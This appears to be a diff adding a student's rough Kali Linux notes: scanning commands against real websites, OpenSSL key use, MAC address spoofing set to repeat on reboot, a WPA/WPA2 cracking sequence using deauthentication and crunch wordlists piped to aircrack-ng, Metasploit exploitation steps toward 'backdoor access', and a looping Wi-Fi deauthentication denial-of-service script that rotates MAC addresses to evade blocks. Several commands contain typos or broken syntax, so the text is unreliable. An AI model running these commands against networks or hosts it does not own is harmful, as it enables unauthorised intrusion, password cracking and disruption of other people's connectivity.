@@ -141,3 +141,480 @@ Become anonymous in kali linux
 */
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+whois ipaddress
+whois netflix.com
+host netflix.com
+dig -mx netflix.com
+
+
+
+
+
+
+
+
+openssl genrsa -des3 -out private.key 4096
+ 2016  ls
+ 2017  openssl  rsa -in private.key -pubout -out public.key 
+ 2018  ls
+ 2019  openssl  rsautil -encrypt -pubin -inkey public.key -in rsaalgo.txt -out encryptedrsaalgo.txt
+ 2020  openssl  rsautl -encrypt -pubin -inkey public.key -in rsaalgo.txt -out encryptedrsaalgo.txt
+ 2021  ls
+ 2022  cat  encryptedrsaalgo.txt
+ 2023  openssl  rsautl -decrypt  -inkey private.key -in encryptedrsaalgo.txt -out decryptedencryptedrsaalgo.txt
+ 2024  ls
+ 2025  cat decryptedencryptedrsaalgo.txt
+ 2026  clear
+ 2027  openssl genrsa -des3 -out -ca.key 4096
+ 2028  openssl req -new -x509 -days 365 -key -ca.key -out -creating.crt
+ 2029  ls
+ 2030  cat -creating.crt
+ 2031  cat creating.crt
+ 2032  cat  -creating.crt
+ 2033  cat  '-creating.crt'
+ 2034  md5sum -creating.crt
+ 2035  cat  creating.crt
+ 2036  md5sum creating.crt
+ 2037  sslscan www.edureka.co
+ 2038  sudo apt install sslscan
+ 2039  sslscan www.edureka.co
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ /*
+ run kali tools on any linux distribution such as ubuntu or parrot using katoolin
+ 2040  git clone https://github.com/LionSec/katoolin.git && cp katoolin/katoolin.py /usr/bin/katoolin
+ 2041  chmod +x /usr/bin/katoolin
+ 2042  sudp chmod +x /usr/bin/katoolin
+ 2043  sudo chmod +x /usr/bin/katoolin
+ 2044  sudo katoolin
+*/
+
+
+
+
+
+
+
+
+
+/* 
+nano cmds.txt ---- opens empty file in nano
+enter content in file
+now ctrl + o to write out
+now check saving file name press 'enter'
+press ctrl + x
+your file named as cmds.txt is saved. 
+*/
+
+
+
+
+
+
+
+
+
+
+
+/*
+ls -l ---list all files and folders
+ls -la  ---- list all hidden files and foldeers also.
+less abc.txt ---- see file in new window 
+cat abc.txt | grep hello ---- it means pipelining two commands cat and grep ------ show abc.txt and extract those lines only which consists hello and show only thos e lines
+echo "ab" > abc.txt ----- writes ab in abc.txt
+
+chmod +x abc.sh  ----- make abc.sh file executable
+./abc.sh
+
+sudo su -        ----- from awadhi123@ to root@ 
+
+
+
+/ -> home/ -> awadhi123/ i.e. ~
+
+
+
+------------------------------------
+/*
+operations under awadhi123@----
+sudo useradd username
+sudo groupadd groupname
+sudo chown username:groupname abc.txt
+*/
+
+
+
+
+
+
+
+
+/*
+operation under root@ that is obtained by applying sudo su - on awadhi123@
+
+useradd username
+groupadd groupname
+chown username:groupname abc.txt
+*/
+
+
+
+
+
+/* chmod 
+
+sudo chmod u+rwx g-x o+rw filename     ------------ it means give user read write execute permission , remove execute permisssion from group  and give read and write permission to other.
+*/
+
+
+
+
+
+
+
+Become anonymous in kali linux
+proxychain.conf
+
+
+
+
+
+arp -a              /  ///////mac with ip
+
+
+
+
+
+
+
+/*
+
+machanger --help    ------>>>>> sudo apt-get install macchanger
+
+https://askubuntu.com/questions/397806/mac-address-error-device-or-resource-busy
+macchanger -s wlp3s0   ///// show mac address
+macchanger -r wlp3s0    //////  change to random mac addresss
+///////  if interface up or insufficient permssiom then do following
+
+ifconfig wlp3s0 down
+macchanger -r wlp3s0 
+ifconfig wlp3s0 up
+*/
+
+
+
+
+
+
+
+/* change mac address after each rebooting*/
+crontab --help
+crontab -e     ----->>>  enter   ---->>> nano  mode   ---->>>>    @reboot macchanger -r eth0   --->>>> save file
+*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*
+wifi craacking or 
+wireless pentesting 
+1. aircrack - ng ---->> used to crack wpa and wpa2.    ---->>> sudo apt-get install aircrack-ng
+
+2. crunch        ------->>>>>>>    sudo apt-get install crunch
+crunch 2 3 1458     ----->>>>> all possible numbers using 1,4,5,8 of length 2 and 3.
+
+
+
+
+
+
+sudo ifconfig wlp3s0 down
+ sudo iwconfig wlp3s0 mode monitor
+ sudo ifconfig wlp3s0 up
+  ifconfig
+   airmon-ng check wlp3s0       or airmon-ng check kill
+   airodump-ng wlp3s0
+ airodump-ng -c 6 -w /Desktop/test_capture/ --bssid macaddreess
+ airmon-ng start wlp3s0 6     /// 6 is channel
+ aireplay-ng  -0 0 macaddress                        i.e.bssid                      ///// broadcasting deauthenticating msg.
+ cd scan
+ root/scan / : # crunch 12 12 -t sweetshi@%%% qwertyuiop123456789 | aircrack-ng -w -capture01.cap -e essid
+*/
+
+
+
+
+
+
+
+
+
+
+
+
+/* 
+  parrot os   vs kali linux 
+  
+*/
+
+
+
+
+
+
+
+
+
+
+/*
+
+
+sudo apt-get install postgresql
+
+installing metasploit ->
+      sudo apt-get install curl
+      curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall && ./msfinstall
+
+
+open metasploit-
+      msfconsole  --->>>no 
+      msf > banner
+      msf > help
+      msf > show exploits
+      msf > info exploit_name
+      msf > use exploit_name
+      msf(exploit_name) > show options
+      msf(exploit_name) > exploit
+      msf(exploit_name) > back  ==== msf
+      msf > whois ipaddress
+      msf >  nmap -F -sV www.nitkkr.ac.in    ///// scannng domain name
+      search apache hhtpd                     //// get exploit names in any version
+      info exploit_name_obtaind _by_search
+      use exploit_name_obtaind _by_search
+      show options
+      set rhost ip_address
+      show options                     //////// to check that rhost is set
+      run                           ////// u can ger backdoor access or something else
+      
+      msf>back
+      msf>exit            //////// stoppes metasploit interface server
+      
+        
+      
+      
+    
+use metasploit2 also
+*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*
+nmap-----
+
+nmap --help
+nmap -F ip_adreesss          /////// -F is used for fast purpose
+nmap edureka.co
+nmap ip_addr1 ip_addr2
+nmap 192.168.25.1-30   //// 1 to 30 all ip_addresses
+nmap -iL targets.txt        ////////  all ipaddresses are present in targets.txt file which have to be scanned
+
+nmap -p 20-30,80,443 www.edureka.co     //////scan port number from 20 to 30 from webste of edureka
+nmap -p http,mysql,ftp edureka.co             /////// http,mysql,ftp service 
+
+nmpa -p- edureka.co                 ///////scan all ports
+
+nmap -A edureka.co        ///////aggrresssive scan
+nmap -sV edureka.co    //// service servsion
+nmap -O edureka.co         /////// operting system
+
+
+sudo nmap -traceroute www.edureka.co    /////// how my packets reaches to edureka.co
+
+nmap -F -oN results.txt www.edureka.co    //// write output results in results.txt
+nmap -F -v ip_adresses     /////// verbose mode   
+
+
+
+
+*/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*
+  cross site scripting
+ 
+*/
+
+
+
+
+
+/*
+ WIFI ON ---->>> sudo service network-manager start
+*/
+
+
+
+
+
+
+
+/*
+    Dos/DDOS :
+    
+            sudo ifconfig wlp3s0 down
+ 2036* iwconfig wlp3s0 mode mo
+ 2037  sudo iwconfig wlp3s0 mode monitor
+ 2038  sudo ifconfig wlp3s0 up
+ 2039  iwconfig
+ 2040  sudo iwconfig
+ 2041  sudo airmon-ng check wlp3s0
+ 2042  kill 22611
+ 2043  sudo kill 22611
+ 2044  sudo airmon-ng check kill    ///////run this line until output not becomes empty
+ 2045  sudo airodump-ng wlp3s0
+
+
+
+
+
+
+
+
+
+dos code -----(dosattack.sh)
+	while True
+		do
+			aireplay-ng -0 10 -a mac_address wlp3s0
+			ifconfig wlp3s0 down
+			macchanger -r wlp3s0 | grep New MAC
+			iwconfig wlp3s0 mode monitor 
+			ifconfig wlp3s0 up
+			sleep 5
+		done
+
+----
+
+
+
+
+
+
+
+
+
+
+
+on terminal --
+iwconfig wlp3s0 channel nomberofchannel
+./dosattack.sh
+*/
+
+
+
+
+
+
+
+
+
+
+*/
+
+
+
